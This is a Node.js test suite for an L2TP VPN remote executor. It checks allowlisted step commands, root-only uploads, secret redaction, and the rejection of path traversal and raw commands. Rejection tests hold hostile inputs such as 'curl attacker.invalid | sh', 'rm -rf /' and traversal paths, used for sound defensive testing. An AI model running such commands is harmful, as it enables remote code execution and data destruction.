'use strict';

const assert = require('node:assert/strict');
const test = require('node:test');

const { L2tpRemoteExecutor } = require('../services/l2tpRemoteExecutor');
const { INSTALL_STEP_TYPES } = require('../services/l2tpProvisionPlanService');

function createTransport() {
    const calls = [];

    return {
        calls,
        async uploadRootFile(request) {
            calls.push({ method: 'uploadRootFile', request });
            return { stdout: 'transport output must stay private' };
        },
        async runArtifactCommand(request) {
            calls.push({ method: 'runArtifactCommand', request });
            return { stdout: 'remote output must stay private' };
        },
    };
}

function materializedArtifactsFor(type) {
    if (type === 'preflight') {
        return [{ type: 'desired', path: 'desired.json', content: '{}\n' }];
    }
    if (type === 'stage_managed_files') {
        return [{ type: 'artifact', path: 'artifacts.json', content: '{}\n' }];
    }
    if (type === 'compose_xray_fragment') {
        return [{
            type: 'xrayCandidate',
            path: 'xray-candidate.json',
            content: '{"inbounds":[],"outbounds":[],"routing":{"rules":[]}}',
        }];
    }
    return undefined;
}

test('preflight uploads its root-only desired file before its fixed command', async () => {
    const transport = createTransport();
    const executor = new L2tpRemoteExecutor({ transport });
    const secret = 'vpn-psk-must-not-leak';

    const result = await executor.executeStep({
        operation: { id: 'operation-17' },
        step: {
            type: 'preflight',
            artifacts: [{
                type: 'desired',
                path: 'desired.json',
                content: JSON.stringify({ clientCidr: '10.77.0.0/24', psk: secret }),
            }],
        },
    });

    assert.deepEqual(transport.calls, [
        {
            method: 'uploadRootFile',
            request: {
                operationId: 'operation-17',
                type: 'desired',
                path: 'desired.json',
                content: JSON.stringify({ clientCidr: '10.77.0.0/24', psk: secret }),
                owner: 'root',
                group: 'root',
                mode: 0o600,
            },
        },
        {
            method: 'runArtifactCommand',
            request: {
                operationId: 'operation-17',
                command: 'preflight',
            },
        },
    ]);
    assert.deepEqual(result, {
        ok: true,
        operationId: 'operation-17',
        step: 'preflight',
    });
    assert.doesNotMatch(JSON.stringify(result), new RegExp(secret));
    assert.doesNotMatch(JSON.stringify(transport.calls[1]), new RegExp(secret));
});

test('compose uploads only the fixed Xray candidate artifact before its fixed command', async () => {
    const transport = createTransport();
    const executor = new L2tpRemoteExecutor({ transport });
    const content = '{"inbounds":[],"outbounds":[],"routing":{"rules":[]},"marker":"private-candidate"}';

    const result = await executor.executeStep({
        operation: { id: 'operation-candidate' },
        step: {
            type: 'compose_xray_fragment',
            artifacts: [{ type: 'xrayCandidate', path: 'xray-candidate.json', content }],
        },
    });

    assert.deepEqual(transport.calls, [
        {
            method: 'uploadRootFile',
            request: {
                operationId: 'operation-candidate',
                type: 'xrayCandidate',
                path: 'xray-candidate.json',
                content,
                owner: 'root',
                group: 'root',
                mode: 0o600,
            },
        },
        {
            method: 'runArtifactCommand',
            request: {
                operationId: 'operation-candidate',
                command: 'compose_xray_fragment',
            },
        },
    ]);
    assert.deepEqual(result, {
        ok: true,
        operationId: 'operation-candidate',
        step: 'compose_xray_fragment',
    });
    assert.doesNotMatch(JSON.stringify(result), /private-candidate/);
    assert.doesNotMatch(JSON.stringify(transport.calls[1]), /private-candidate/);
});

test('maps every install-plan step to its same-name allowlisted command', async () => {
    const transport = createTransport();
    const executor = new L2tpRemoteExecutor({ transport });

    for (const type of INSTALL_STEP_TYPES) {
        await executor.executeStep({
            operation: { id: 'operation-all-steps' },
            step: {
                type,
                ...(materializedArtifactsFor(type) === undefined
                    ? {}
                    : { artifacts: materializedArtifactsFor(type) }),
            },
        });
    }

    assert.deepEqual(
        transport.calls
            .filter(call => call.method === 'runArtifactCommand')
            .map(call => call.request.command),
        INSTALL_STEP_TYPES.map(type => type === 'sync_users' ? 'sync-users' : type),
    );
});

test('standalone sync_users uploads exact transient desired users and records only a verifier expectation', async () => {
    const calls = [];
    const secret = 'standalone-sync-secret-canary';
    const content = JSON.stringify({
        credentialRevision: 42,
        users: [
            { login: 'alpha', password: secret, ipAddress: '10.77.0.10', enabled: true },
            { login: 'disabled-user', password: 'disabled-secret', ipAddress: '10.77.0.11', enabled: false },
        ],
    });
    const verifierResult = {
        ok: true,
        credentialRevision: 42,
        enabledUserCount: 1,
        managedUserCount: 1,
        code: 'USERS_VERIFIED',
    };
    const transport = {
        async uploadRootFile(request) {
            calls.push({ method: 'uploadRootFile', request });
        },
        async runArtifactCommand(request) {
            calls.push({ method: 'runArtifactCommand', request });
            return request.command === 'verify-users' ? verifierResult : { ok: true };
        },
    };
    const executor = new L2tpRemoteExecutor({ transport });

    const result = await executor.executeStep({
        operation: {
            id: 'operation-standalone-users',
            kind: 'sync_users',
            plan: { desired: { credentialRevision: 42 } },
        },
        step: {
            type: 'sync_users',
            artifacts: [{ type: 'desired', path: 'desired.json', content }],
        },
    });

    assert.deepEqual(calls, [
        {
            method: 'uploadRootFile',
            request: {
                operationId: 'operation-standalone-users',
                type: 'desired',
                path: 'desired.json',
                content,
                owner: 'root',
                group: 'root',
                mode: 0o600,
            },
        },
        {
            method: 'runArtifactCommand',
            request: { operationId: 'operation-standalone-users', command: 'sync-users' },
        },
    ]);
    assert.deepEqual(result, {
        ok: true,
        operationId: 'operation-standalone-users',
        step: 'sync_users',
    });
    assert.doesNotMatch(JSON.stringify({ result, commands: calls.slice(1) }), new RegExp(secret));
});

test('verify_users maps to the fixed verifier command with the cached typed expectation', async () => {
    const calls = [];
    const content = JSON.stringify({
        credentialRevision: 42,
        users: [{
            login: 'alpha', password: 'verify-step-secret', ipAddress: '10.77.0.10', enabled: true,
        }],
    });
    const verifierResult = {
        ok: true,
        credentialRevision: 42,
        enabledUserCount: 1,
        managedUserCount: 1,
        code: 'USERS_VERIFIED',
    };
    const transport = {
        async uploadRootFile(request) {
            calls.push({ method: 'uploadRootFile', request });
        },
        async runArtifactCommand(request) {
            calls.push({ method: 'runArtifactCommand', request });
            return request.command === 'verify-users' ? verifierResult : { ok: true };
        },
    };
    const executor = new L2tpRemoteExecutor({ transport });
    const operation = {
        id: 'operation-explicit-user-verify',
        kind: 'sync_users',
        plan: { desired: { credentialRevision: 42 } },
    };

    await executor.executeStep({
        operation,
        step: {
            type: 'sync_users',
            artifacts: [{ type: 'desired', path: 'desired.json', content }],
        },
    });
    calls.length = 0;
    const result = await executor.executeStep({ operation, step: { type: 'verify_users' } });

    assert.deepEqual(calls, [{
        method: 'runArtifactCommand',
        request: {
            operationId: 'operation-explicit-user-verify',
            command: 'verify-users',
            expectedCredentialRevision: 42,
            expectedEnabledUserCount: 1,
        },
    }]);
    assert.deepEqual(result, verifierResult);
    assert.doesNotMatch(JSON.stringify({ calls, result }), /verify-step-secret/);
});

test('verify_users returns a strict sanitized mismatch attestation', async () => {
    const mismatch = {
        ok: false,
        credentialRevision: 42,
        enabledUserCount: 1,
        managedUserCount: 2,
        code: 'MANAGED_USERS_EXTRA',
    };
    const executor = new L2tpRemoteExecutor({
        transport: {
            async uploadRootFile() {},
            async runArtifactCommand({ command }) {
                return command === 'verify-users' ? mismatch : { ok: true };
            },
        },
    });

    const operation = {
        id: 'operation-user-mismatch',
        kind: 'sync_users',
        plan: { desired: { credentialRevision: 42 } },
    };
    await executor.executeStep({
        operation,
        step: {
            type: 'sync_users',
            artifacts: [{
                type: 'desired',
                path: 'desired.json',
                content: JSON.stringify({
                    credentialRevision: 42,
                    users: [{
                        login: 'alpha', password: 'mismatch-secret', ipAddress: '10.77.0.10', enabled: true,
                    }],
                }),
            }],
        },
    });
    const result = await executor.executeStep({ operation, step: { type: 'verify_users' } });

    assert.deepEqual(result, mismatch);
    assert.doesNotMatch(JSON.stringify(result), /mismatch-secret/);
});

test('standalone sync_users rejects missing, foreign, malformed, and wrong-revision artifacts', async () => {
    const validUser = {
        login: 'alpha', password: 'artifact-secret-canary', ipAddress: '10.77.0.10', enabled: true,
    };
    const invalidSteps = [
        { type: 'sync_users' },
        { type: 'sync_users', artifacts: [] },
        {
            type: 'sync_users',
            artifacts: [{ type: 'artifact', path: 'artifacts.json', content: '{}' }],
        },
        {
            type: 'sync_users',
            artifacts: [{ type: 'desired', path: 'foreign.json', content: '{}' }],
        },
        {
            type: 'sync_users',
            artifacts: [{ type: 'desired', path: 'desired.json', content: '{not-json}' }],
        },
        {
            type: 'sync_users',
            artifacts: [{
                type: 'desired',
                path: 'desired.json',
                content: JSON.stringify({ credentialRevision: 41, users: [validUser] }),
            }],
        },
        {
            type: 'sync_users',
            artifacts: [{
                type: 'desired',
                path: 'desired.json',
                content: JSON.stringify({ credentialRevision: 42, users: [validUser], command: 'id' }),
            }],
        },
        {
            type: 'sync_users',
            artifacts: [{
                type: 'desired',
                path: 'desired.json',
                content: JSON.stringify({
                    credentialRevision: 42,
                    users: [{ ...validUser, shell: '/bin/sh' }],
                }),
            }],
        },
        {
            type: 'sync_users',
            artifacts: [{
                type: 'desired',
                path: 'desired.json',
                content: JSON.stringify({
                    credentialRevision: 42,
                    users: [{ ...validUser, enabled: 1 }],
                }),
            }],
        },
    ];

    for (const step of invalidSteps) {
        const transport = createTransport();
        const executor = new L2tpRemoteExecutor({ transport });
        await assert.rejects(
            executor.executeStep({
                operation: {
                    id: 'operation-invalid-users',
                    kind: 'sync_users',
                    plan: { desired: { credentialRevision: 42 } },
                },
                step,
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.match(error.code, /^(ARTIFACT_|DESIRED_USERS_|CREDENTIAL_REVISION_)/);
                assert.doesNotMatch(JSON.stringify(error), /artifact-secret-canary|foreign\.json|not-json|\bid\b/);
                return true;
            },
        );
        assert.deepEqual(transport.calls, []);
    }
});

test('standalone sync_users rejects untrusted verifier results without leaking them', async () => {
    const secret = 'untrusted-verifier-secret-canary';
    const desiredContent = JSON.stringify({
        credentialRevision: 42,
        users: [{ login: 'alpha', password: secret, ipAddress: '10.77.0.10', enabled: true }],
    });
    const base = {
        ok: true,
        credentialRevision: 42,
        enabledUserCount: 1,
        managedUserCount: 1,
        code: 'USERS_VERIFIED',
    };
    const invalidResults = [
        secret,
        { ...base, credentialRevision: 41 },
        { ...base, enabledUserCount: 2, managedUserCount: 2 },
        { ...base, code: 'FOREIGN_RESULT' },
        { ...base, raw: secret },
        { ...base, ok: 1 },
        { ...base, managedUserCount: '1' },
        { ...base, managedUserCount: 1.5 },
        { ...base, code: { secret } },
    ];

    for (const invalidResult of invalidResults) {
        const transport = {
            async uploadRootFile() {},
            async runArtifactCommand({ command }) {
                return command === 'verify-users' ? invalidResult : { ok: true };
            },
        };
        const executor = new L2tpRemoteExecutor({ transport });
        const operation = {
            id: 'operation-untrusted-verifier',
            kind: 'sync_users',
            plan: { desired: { credentialRevision: 42 } },
        };
        await executor.executeStep({
            operation,
            step: {
                type: 'sync_users',
                artifacts: [{ type: 'desired', path: 'desired.json', content: desiredContent }],
            },
        });
        await assert.rejects(
            executor.executeStep({ operation, step: { type: 'verify_users' } }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, 'USER_VERIFICATION_INVALID');
                assert.equal(error.message, 'Invalid L2TP user verification result');
                assert.doesNotMatch(JSON.stringify(error), new RegExp(secret));
                return true;
            },
        );
    }
});

test('requires exactly one materialized typed artifact only on its three declared steps', async () => {
    const invalidCases = [
        { step: { type: 'preflight' } },
        { step: { type: 'stage_managed_files', artifacts: [] } },
        { step: { type: 'compose_xray_fragment' } },
        {
            step: {
                type: 'preflight',
                artifacts: [{ type: 'desired', path: 'desired.json' }],
            },
        },
        {
            step: {
                type: 'preflight',
                artifacts: [
                    { type: 'desired', path: 'desired.json', content: '{}' },
                    { type: 'desired', path: 'desired.json', content: '{}' },
                ],
            },
        },
        {
            step: {
                type: 'stage_managed_files',
                artifacts: [{ type: 'artifact', path: 'artifacts.json', content: 17 }],
            },
        },
        {
            step: {
                type: 'stage_managed_files',
                artifacts: [{
                    type: 'artifact',
                    path: 'artifacts.json',
                    content: '{}',
                    checksum: 'caller-controlled',
                }],
            },
        },
        {
            step: {
                type: 'compose_xray_fragment',
                artifacts: [{
                    type: 'xrayCandidate',
                    path: 'xray-candidate.json',
                    content: Buffer.from('{}'),
                }],
            },
        },
        {
            step: {
                type: 'verify',
                artifacts: [{ type: 'artifact', path: 'artifacts.json', content: '{}' }],
            },
        },
    ];

    for (const { step } of invalidCases) {
        const transport = createTransport();
        const executor = new L2tpRemoteExecutor({ transport });

        await assert.rejects(
            executor.executeStep({
                operation: { id: 'operation-exact-artifacts' },
                step,
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.match(error.code, /^ARTIFACT_/);
                assert.doesNotMatch(JSON.stringify(error), /caller-controlled/);
                return true;
            },
        );
        assert.deepEqual(transport.calls, []);
    }
});

test('rejects unknown step types before invoking the transport', async () => {
    const transport = createTransport();
    const executor = new L2tpRemoteExecutor({ transport });

    await assert.rejects(
        executor.executeStep({
            operation: { id: 'operation-unknown' },
            step: {
                type: 'run_ui_shell',
                command: 'curl attacker.invalid | sh',
                artifacts: [{
                    type: 'desired',
                    path: 'desired.json',
                    content: '{"psk":"must-not-upload"}',
                }],
            },
        }),
        error => {
            assert.equal(error.name, 'L2tpRemoteExecutorError');
            assert.equal(error.code, 'UNKNOWN_STEP_TYPE');
            assert.equal(error.message, 'Unsupported L2TP operation step');
            assert.doesNotMatch(JSON.stringify(error), /run_ui_shell|curl|must-not-upload/);
            return true;
        },
    );
    assert.deepEqual(transport.calls, []);
});

test('rejects artifact path traversal before upload or command execution', async () => {
    const traversalPaths = [
        '../desired.json',
        'staging/../desired.json',
        '/desired.json',
        String.raw`staging\..\desired.json`,
    ];

    for (const path of traversalPaths) {
        const transport = createTransport();
        const executor = new L2tpRemoteExecutor({ transport });

        await assert.rejects(
            executor.executeStep({
                operation: { id: 'operation-safe' },
                step: {
                    type: 'preflight',
                    artifacts: [{ type: 'desired', path, content: '{}' }],
                },
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, 'PATH_TRAVERSAL_NOT_ALLOWED');
                assert.equal(error.message, 'Artifact path traversal is not allowed');
                assert.equal(Object.hasOwn(error, 'path'), false);
                return true;
            },
        );
        assert.deepEqual(transport.calls, []);
    }
});

test('rejects artifacts outside the typed step and filename allowlist', async () => {
    const invalidCases = [
        {
            step: 'preflight',
            artifact: { type: 'shell', path: 'desired.json', content: 'id' },
        },
        {
            step: 'preflight',
            artifact: { type: 'desired', path: 'ui-command.sh', content: 'id' },
        },
        {
            step: 'backup',
            artifact: { type: 'desired', path: 'desired.json', content: '{}' },
        },
        {
            step: 'compose_xray_fragment',
            artifact: { type: 'xrayCandidate', path: 'candidate/xray.json', content: '{}' },
        },
        {
            step: 'compose_xray_fragment',
            artifact: { type: 'artifact', path: 'xray-candidate.json', content: '{}' },
        },
        {
            step: 'validate_xray',
            artifact: { type: 'xrayCandidate', path: 'xray-candidate.json', content: '{}' },
        },
    ];

    for (const { step, artifact } of invalidCases) {
        const transport = createTransport();
        const executor = new L2tpRemoteExecutor({ transport });

        await assert.rejects(
            executor.executeStep({
                operation: { id: 'operation-artifact-allowlist' },
                step: { type: step, artifacts: [artifact] },
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, 'ARTIFACT_NOT_ALLOWED');
                assert.equal(error.message, 'Artifact is not allowed for this L2TP operation step');
                assert.doesNotMatch(JSON.stringify(error), /ui-command|\bid\b/);
                return true;
            },
        );
        assert.deepEqual(transport.calls, []);
    }
});

test('rejects caller-supplied raw commands and argv even for an allowed step', async () => {
    const rawInputs = [
        { command: 'curl attacker.invalid | sh' },
        { argv: ['--password', 'ui-secret'] },
        { args: ['--password', 'args-secret'] },
        { arguments: ['--password', 'arguments-secret'] },
        { stdin: 'stdin-secret' },
        { env: { PASSWORD: 'env-secret' } },
        { cwd: '/tmp/raw-command' },
        { shell: 'rm -rf /' },
    ];

    for (const rawInput of rawInputs) {
        const transport = createTransport();
        const executor = new L2tpRemoteExecutor({ transport });

        await assert.rejects(
            executor.executeStep({
                operation: { id: 'operation-no-shell' },
                step: { type: 'preflight', ...rawInput },
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, 'RAW_COMMAND_NOT_ALLOWED');
                assert.equal(error.message, 'Raw commands are not accepted by the L2TP executor');
                assert.doesNotMatch(JSON.stringify(error), /attacker|ui-secret|rm -rf/);
                return true;
            },
        );
        assert.deepEqual(transport.calls, []);
    }
});

test('rollback issues exactly one typed fixed command without failure details or secrets', async () => {
    const transport = createTransport();
    const executor = new L2tpRemoteExecutor({ transport });
    const secret = 'rollback-error-secret';

    const result = await executor.rollback({
        operation: { id: 'operation-rollback' },
        completedSteps: [{ type: 'backup' }, { type: 'stage_managed_files' }],
        failedStep: { type: 'start_l2tp' },
        error: new Error(`remote failed with ${secret}`),
    });

    assert.deepEqual(transport.calls, [{
        method: 'runArtifactCommand',
        request: {
            operationId: 'operation-rollback',
            command: 'rollback',
        },
    }]);
    assert.deepEqual(result, {
        ok: true,
        operationId: 'operation-rollback',
        step: 'rollback',
    });
    assert.doesNotMatch(JSON.stringify({ calls: transport.calls, result }), new RegExp(secret));
});

test('sanitizes upload and command transport failures before returning them', async () => {
    const secret = 'transport-failure-secret';
    const cases = [
        {
            expectedCode: 'REMOTE_UPLOAD_FAILED',
            expectedMessage: 'Failed to upload an L2TP operation artifact',
            transport: {
                async uploadRootFile() { throw new Error(`upload leaked ${secret}`); },
                async runArtifactCommand() { throw new Error('must not run'); },
            },
            step: {
                type: 'preflight',
                artifacts: [{
                    type: 'desired',
                    path: 'desired.json',
                    content: JSON.stringify({ psk: secret }),
                }],
            },
        },
        {
            expectedCode: 'REMOTE_COMMAND_FAILED',
            expectedMessage: 'Failed to run an L2TP artifact command',
            transport: {
                async uploadRootFile() {},
                async runArtifactCommand() { throw new Error(`command leaked ${secret}`); },
            },
            step: { type: 'verify' },
        },
    ];

    for (const testCase of cases) {
        const executor = new L2tpRemoteExecutor({ transport: testCase.transport });

        await assert.rejects(
            executor.executeStep({
                operation: { id: 'operation-transport-failure' },
                step: testCase.step,
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, testCase.expectedCode);
                assert.equal(error.message, testCase.expectedMessage);
                assert.equal(Object.hasOwn(error, 'cause'), false);
                assert.doesNotMatch(JSON.stringify(error), new RegExp(secret));
                return true;
            },
        );
    }
});

test('resolves one lazy transport per claimed operation and reuses it for every fixed command', async () => {
    const resolverCalls = [];
    const transportCalls = [];
    const transports = new Map();
    const transportResolver = async request => {
        resolverCalls.push(request);
        const transport = {
            async uploadRootFile(upload) {
                transportCalls.push({ operationId: request.operationId, method: 'uploadRootFile', request: upload });
            },
            async runArtifactCommand(command) {
                transportCalls.push({ operationId: request.operationId, method: 'runArtifactCommand', request: command });
            },
        };
        transports.set(request.operationId, transport);
        return transport;
    };
    const executor = new L2tpRemoteExecutor({ transportResolver });
    const first = { id: 'operation-lazy-a', node: 'relay-a' };
    const second = { id: 'operation-lazy-b', node: { _id: 'relay-b' } };

    assert.deepEqual(resolverCalls, []);
    assert.deepEqual(transportCalls, []);

    await executor.executeStep({ operation: first, step: { type: 'verify' } });
    await executor.executeStep({ operation: first, step: { type: 'commit' } });
    await executor.rollback({ operation: first });
    await executor.executeStep({ operation: second, step: { type: 'verify' } });

    assert.deepEqual(resolverCalls, [
        { operationId: 'operation-lazy-a', nodeId: 'relay-a' },
        { operationId: 'operation-lazy-b', nodeId: 'relay-b' },
    ]);
    assert.equal(transports.size, 2);
    assert.deepEqual(
        transportCalls.map(call => [call.operationId, call.method, call.request.command]),
        [
            ['operation-lazy-a', 'runArtifactCommand', 'verify'],
            ['operation-lazy-a', 'runArtifactCommand', 'commit'],
            ['operation-lazy-a', 'runArtifactCommand', 'rollback'],
            ['operation-lazy-b', 'runArtifactCommand', 'verify'],
        ],
    );
});

test('sanitizes resolver failures and never attempts a remote call', async () => {
    const secret = 'resolver-database-password';
    const resolverCalls = [];
    const executor = new L2tpRemoteExecutor({
        async transportResolver(request) {
            resolverCalls.push(request);
            throw new Error(`lookup failed with ${secret}`);
        },
    });
    const operation = { id: 'operation-unavailable', node: 'relay-unavailable' };

    for (const action of [
        () => executor.executeStep({ operation, step: { type: 'verify' } }),
        () => executor.rollback({ operation }),
    ]) {
        await assert.rejects(
            action(),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, 'NODE_EXECUTION_UNAVAILABLE');
                assert.equal(error.message, 'Node execution is unavailable');
                assert.equal(Object.hasOwn(error, 'cause'), false);
                assert.doesNotMatch(JSON.stringify(error), new RegExp(secret));
                return true;
            },
        );
    }

    assert.deepEqual(resolverCalls, [{
        operationId: 'operation-unavailable',
        nodeId: 'relay-unavailable',
    }]);
});
